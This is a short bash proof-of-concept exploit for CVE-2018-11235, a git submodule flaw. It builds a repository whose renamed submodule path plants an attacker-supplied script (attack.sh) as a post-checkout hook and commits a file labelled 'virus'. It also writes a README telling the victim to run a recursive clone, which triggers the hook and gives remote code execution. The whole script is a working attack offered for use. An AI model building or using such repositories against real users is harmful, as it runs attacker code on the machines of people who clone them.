#!/bin/bash

# Local fake submodule. Create on the machine.
fake_submodule="fake_submodule"

# Our malicious malicious_repo
malicious_repo="malicious_repo"

# Creation of the fake submodule
git init "$fake_submodule"
cd "$fake_submodule"
echo "Hello World ! I am the fake submodule !" >> hello.txt
git add hello.txt
git commit -m "Add Hello World file"
cp ../client.app ./
git add client.app
git commit -m "Add virus"
cd ..

# Creation of our malicious repo
git init "$malicious_repo"
cd "$malicious_repo"

# Add the fake submodule, only to have a name
fake_submodule='./../fake_submodule'
git submodule add "$fake_submodule" malicious_submodule

mkdir modules
cp -r .git/modules/malicious_submodule modules
cp ../attack.sh modules/malicious_submodule/hooks/post-checkout
git add modules

git config -f .gitmodules --rename-section submodule.malicious_submodule submodule.../../modules/malicious_submodule

git submodule add "$fake_submodule"

git commit -m "CVE-2018-11235"

cd ..

echo "--- Remote Code Execution using git (CVE-2018-11235) ---" > README.txt
echo "--- Execute this command ---" >> README.txt
echo "git clone --recurse-submodules $PWD/$malicious_repo client_pwned" >> README.txt

# Special thanks to Rogdham and CHYbeta for their PoC on which this script is inspired.
